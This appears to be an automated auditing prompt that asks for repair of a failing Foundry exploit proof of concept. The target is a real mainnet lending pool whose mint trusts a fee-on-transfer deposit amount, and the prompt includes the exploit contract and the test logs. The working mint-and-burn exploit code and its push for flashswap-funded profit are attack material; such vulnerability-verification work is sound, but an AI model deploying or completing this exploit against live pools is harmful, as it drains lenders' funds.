You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Minting trusts the requested ERC20 deposit amount instead of the amount actually received
- claim: The mint path prices shares from the caller-supplied `depositAmount` before any transfer happens, then only checks whether `transferFrom` returned success. It never measures the contract's actual balance delta, so a fee-on-transfer or otherwise deflationary `loanTokenAddress` can deliver fewer tokens than `depositAmount` while the minter still receives shares as if the full amount arrived.
- impact: An attacker can over-mint iTokens, diluting existing lenders and later redeeming more underlying than they contributed. If enough liquidity exists, this can make the pool insolvent.
- exploit_paths: ["Use a pool whose `loanTokenAddress` burns, taxes, or otherwise transfers less than the requested amount.", "Call `mint(receiver, X)` so `_safeTransferFrom` succeeds but the contract receives less than `X`.", "Receive shares computed from `X`, then burn them later for a disproportionate amount of underlying."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ILoanTokenLike {
    function loanTokenAddress() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function mint(address receiver, uint256 depositAmount) external returns (uint256);
    function burn(address receiver, uint256 burnAmount) external returns (uint256);
}

contract FlawVerifier {
    address internal constant TARGET = 0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    ILoanTokenLike internal constant POOL = ILoanTokenLike(TARGET);

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    string public status;
    string public exploitPathUsed;

    address internal _profitToken;
    uint256 internal _profitAmount;
    uint256 public attackerSpendAmount;
    uint256 public poolReceiveAmount;
    uint256 public burnReturnAmount;

    constructor() {
        _profitToken = address(0);
        status = "not-run";
    }

    function executeOnOpportunity() external {
        require(!executed, "ALREADY_EXECUTED");
        executed = true;

        address loanToken = POOL.loanTokenAddress();
        _profitToken = loanToken;

        // Path stage 1 requires the pool's own underlying to short-deliver transfers.
        // When the target market itself is WETH, that prerequisite is not met on-chain.
        if (loanToken == WETH) {
            hypothesisRefuted = true;
            status = "refuted:loanToken-is-weth";
            exploitPathUsed = "stage1-infeasible: loanTokenAddress() is WETH, so mint cannot receive less than the requested ERC20 amount";
            return;
        }

        uint256 verifierBalance = IERC20Like(loanToken).balanceOf(address(this));
        if (verifierBalance == 0) {
            // The requested attack plan must pass through mint(X) on the target pool's own
            // underlying token. Under the required direct_or_existing_balance_first strategy,
            // no verifier-held balance means the path cannot even reach stage 2 directly.
            //
            // A temporary external flash-loan of the same token is not a self-funding
            // substitute for standard fee-on-transfer semantics: the attacker must repay the
            // flash-loan's full nominal principal, while a later burn of the over-minted shares
            // can only redeem less than that nominal amount whenever the pool actually received
            // less than X. That makes the route non-self-funding after repayment.
            status = "infeasible:no-verifier-loan-token-balance";
            exploitPathUsed = "stage1->stage2->stage3 requires direct loanToken balance; no direct balance was available";
            return;
        }

        uint256[6] memory divisors = [uint256(32), 16, 8, 4, 2, 1];
        for (uint256 i = 0; i < divisors.length; i++) {
            uint256 depositAmount = verifierBalance / divisors[i];
            if (depositAmount == 0) {
                continue;
            }

            AttemptResult memory result = _attemptMintBurnPath(loanToken, depositAmount);
            if (result.stage2Triggered) {
                hypothesisValidated = true;
                exploitPathUsed = "mint(receiver,X)->pool receives less than X->burn over-minted shares";
                attackerSpendAmount = result.attackerSpend;
                poolReceiveAmount = result.poolReceive;
                burnReturnAmount = result.burnReturn;

                if (result.finalBalance > result.startBalance) {
                    _profitAmount = result.finalBalance - result.startBalance;
                    status = "validated:profit";
                } else {
                    _profitAmount = 0;
                    status = "validated:no-profit";
                }
                return;
            }

            if (result.mintSucceeded) {
                hypothesisRefuted = true;
                status = "refuted:mint-received-full-amount";
                exploitPathUsed = "stage2-infeasible: target mint received the full requested amount";
                return;
            }
        }

        status = "infeasible:mint-path-not-executable";
        exploitPathUsed = "direct mint path could not be executed with verifier-held balance";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    struct AttemptResult {
        bool mintSucceeded;
        bool stage2Triggered;
        uint256 startBalance;
        uint256 finalBalance;
        uint256 attackerSpend;
        uint256 poolReceive;
        uint256 burnReturn;
    }

    function _attemptMintBurnPath(address loanToken, uint256 depositAmount) internal returns (AttemptResult memory result) {
        result.startBalance = IERC20Like(loanToken).balanceOf(address(this));
        uint256 poolBalanceBefore = IERC20Like(loanToken).balanceOf(TARGET);
        uint256 shareBalanceBefore = POOL.balanceOf(address(this));

        _forceApprove(loanToken, TARGET, depositAmount);

        uint256 mintedShares;
        try POOL.mint(address(this), depositAmount) returns (uint256 minted) {
            result.mintSucceeded = true;
            mintedShares = minted;
        } catch {
            return result;
        }

        uint256 shareBalanceAfterMint = POOL.balanceOf(address(this));
        if (mintedShares == 0 && shareBalanceAfterMint > shareBalanceBefore) {
            mintedShares = shareBalanceAfterMint - shareBalanceBefore;
        }

        uint256 attackerAfterMint = IERC20Like(loanToken).balanceOf(address(this));
        uint256 poolBalanceAfterMint = IERC20Like(loanToken).balanceOf(TARGET);
        result.attackerSpend = result.startBalance - attackerAfterMint;
        result.poolReceive = poolBalanceAfterMint - poolBalanceBefore;

        if (mintedShares == 0 || result.poolReceive >= depositAmount) {
            result.finalBalance = attackerAfterMint;
            return result;
        }

        result.stage2Triggered = true;

        uint256 receiverBeforeBurn = attackerAfterMint;
        try POOL.burn(address(this), mintedShares) returns (uint256) {
            uint256 finalBalance = IERC20Like(loanToken).balanceOf(address(this));
            result.finalBalance = finalBalance;
            result.burnReturn = finalBalance - receiverBeforeBurn;
        } catch {
            result.finalBalance = attackerAfterMint;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        uint256 currentAllowance = IERC20Like(token).allowance(address(this), spender);
        if (currentAllowance >= amount) {
            return;
        }

        (bool ok0, bytes memory ret0) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        require(ok0 && (ret0.length == 0 || abi.decode(ret0, (bool))), "APPROVE_RESET_FAILED");

        (bool ok1, bytes memory ret1) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
        require(ok1 && (ret1.length == 0 || abi.decode(ret1, (bool))), "APPROVE_SET_FAILED");
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.50s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 230235)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 6419

Traces:
  [230235] FlawVerifierTest::testExploit()
    ├─ [2382] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [191354] FlawVerifier::executeOnOpportunity()
    │   ├─ [2377] 0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b::loanTokenAddress() [staticcall]
    │   │   └─ ← [Return] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e
    │   ├─ [2541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [382] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e
    ├─ [2402] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 18695728 [1.869e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 6419)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 8.09s (2.22s CPU time)

Ran 1 test suite in 8.68s (8.09s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 230235)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
